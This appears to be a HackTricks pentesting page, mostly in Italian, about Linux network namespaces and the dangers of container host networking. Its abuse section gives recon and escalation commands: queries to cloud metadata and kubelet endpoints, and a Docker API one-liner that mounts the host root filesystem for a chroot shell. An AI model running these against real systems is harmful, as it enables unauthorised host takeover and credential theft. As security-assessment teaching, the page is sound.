# Namespace di rete

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il namespace di rete isola le risorse correlate alla rete come interfacce, indirizzi IP, tabelle di routing, stato ARP/neighbor, regole del firewall, socket e il contenuto di file come `/proc/net`. Per questo un container può avere quello che sembra un proprio `eth0`, le proprie rotte locali e il proprio dispositivo loopback senza possedere lo stack di rete reale dell'host.

Sotto il profilo della sicurezza, questo è importante perché l'isolamento di rete riguarda molto più del semplice port binding. Un namespace di rete privato limita ciò che il workload può osservare o riconfigurare direttamente. Quando quel namespace viene condiviso con l'host, il container può improvvisamente ottenere visibilità sui listener dell'host, sui servizi locali dell'host e sui punti di controllo della rete che non erano mai stati pensati per essere esposti all'applicazione.

## Funzionamento

Un namespace di rete appena creato inizia con un ambiente di rete vuoto o quasi vuoto finché non gli vengono collegate delle interfacce. I runtime dei container poi creano o connettono interfacce virtuali, assegnano indirizzi e configurano le rotte in modo che il workload abbia la connettività prevista. Nelle deployment basate su bridge, questo solitamente significa che il container vede un'interfaccia veth collegata a un bridge dell'host. In Kubernetes, i plugin CNI gestiscono la configurazione equivalente per il networking dei Pod.

Questa architettura spiega perché `--network=host` o `hostNetwork: true` rappresentano un cambiamento così drastico. Invece di ricevere uno stack di rete privato predisposto, il workload si unisce a quello reale dell'host.

## Laboratorio

Puoi vedere un namespace di rete quasi vuoto con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E puoi confrontare i container normali e quelli con rete host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Il container con rete host non ha più la propria vista isolata di socket e interfacce. Solo questo cambiamento è già significativo prima ancora di chiedersi quali capability abbia il processo.

## Uso a runtime

Docker e Podman normalmente creano un namespace di rete privato per ogni container salvo diversa configurazione. Kubernetes di solito assegna a ogni Pod il proprio namespace di rete, condiviso dai container all'interno di quel Pod ma separato dall'host. Anche sistemi Incus/LXC forniscono un ricco isolamento basato su namespace di rete, spesso con una più ampia varietà di configurazioni di networking virtuale.

Il principio comune è che il networking privato è il confine di isolamento predefinito, mentre il networking host è un'esplicita deroga a quel confine.

## Misconfigurazioni

La misconfigurazione più importante è semplicemente condividere il namespace di rete dell'host. Questo a volte viene fatto per performance, monitoring a basso livello o comodità, ma rimuove uno dei confini più netti disponibili per i container. I listener locali all'host diventano raggiungibili in modo più diretto, i servizi accessibili solo da localhost possono diventare accessibili, e capability come `CAP_NET_ADMIN` o `CAP_NET_RAW` diventano molto più pericolose perché le operazioni che abilitano vengono ora applicate all'ambiente di rete dell'host.

Un altro problema è concedere eccessivamente capability correlate alla rete anche quando il namespace di rete è privato. Un namespace privato aiuta, ma non rende innocui i raw sockets o il controllo di rete avanzato.

In Kubernetes, `hostNetwork: true` cambia anche quanto puoi fidarti della segmentazione di rete a livello di Pod. Kubernetes documenta che molti plugin di rete non riescono a distinguere correttamente il traffico dei Pod con `hostNetwork` ai fini del matching `podSelector` / `namespaceSelector` e quindi lo trattano come normale traffico del nodo. Dal punto di vista di un attaccante, ciò significa che un workload compromesso con `hostNetwork` dovrebbe spesso essere considerato come un punto d'appoggio di rete a livello di nodo piuttosto che come un Pod normale ancora vincolato dalle stesse assunzioni di policy dei workload su overlay network.

## Abuso

In configurazioni debolmente isolate, gli attaccanti possono ispezionare i servizi in ascolto sull'host, raggiungere endpoint di gestione vincolati solo al loopback, sniffare o interferire con il traffico a seconda delle capability e dell'ambiente, o riconfigurare routing e stato del firewall se è presente `CAP_NET_ADMIN`. In un cluster, questo può anche facilitare il movimento laterale e la ricognizione del control-plane.

Se sospetti il networking host, inizia confermando che le interfacce e i listener visibili appartengano all'host piuttosto che a una rete container isolata:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
I servizi accessibili solo tramite loopback sono spesso la prima scoperta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se sono presenti capability di rete, verifica se il workload può ispezionare o modificare lo stack visibile:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Su kernel moderni, la rete dell'host insieme a `CAP_NET_ADMIN` può anche esporre il percorso dei pacchetti oltre alle semplici modifiche di `iptables` / `nftables`. Anche i qdiscs e i filtri di `tc` sono a livello di namespace, quindi in un host network namespace condiviso si applicano alle interfacce host che il container può vedere. Se è presente anche `CAP_BPF`, diventano rilevanti anche i programmi eBPF relativi alla rete, come TC e XDP loaders:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Questo è importante perché un attacker può riuscire a mirror, redirect, shape o drop del traffico a livello dell'interfaccia host, non solo a riscrivere le firewall rules. In un private network namespace queste azioni sono contenute nella vista del container; in un shared host namespace diventano host-impacting.

In ambienti cluster o cloud, host networking giustifica anche una rapida local recon di metadata e servizi adiacenti al control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Esempio completo: Host Networking + Local Runtime / Kubelet Access

Host networking non fornisce automaticamente host root, ma spesso espone servizi intenzionalmente raggiungibili solo dal nodo stesso. Se uno di questi servizi è debolmente protetto, host networking diventa un percorso diretto di privilege-escalation.

Docker API su localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet su localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impatto:

- compromissione diretta dell'host se un'API runtime locale è esposta senza adeguata protezione
- ricognizione del cluster o movimento laterale se kubelet o agent locali sono raggiungibili
- manipolazione del traffico o denial of service se combinato con `CAP_NET_ADMIN`

## Controlli

Lo scopo di questi controlli è capire se il processo ha uno stack di rete privato, quali rotte e listener sono visibili e se la vista di rete appare già simile a quella dell'host prima ancora di testare le capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
What is interesting here:

- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
- `lsns -t net` and `ip netns identify` are useful when the shell is already inside a named or persistent namespace and you want to correlate it with `/run/netns` objects from the host side.
- `ss -lntup` is especially valuable because it reveals loopback-only listeners and local management endpoints.
- Routes, interface names, firewall context, `tc` state, and eBPF attachments become much more important if `CAP_NET_ADMIN`, `CAP_NET_RAW`, or `CAP_BPF` is present.
- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.

When reviewing a container, always evaluate the network namespace together with the capability set. Host networking plus strong network capabilities is a very different posture from bridge networking plus a narrow default capability set.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
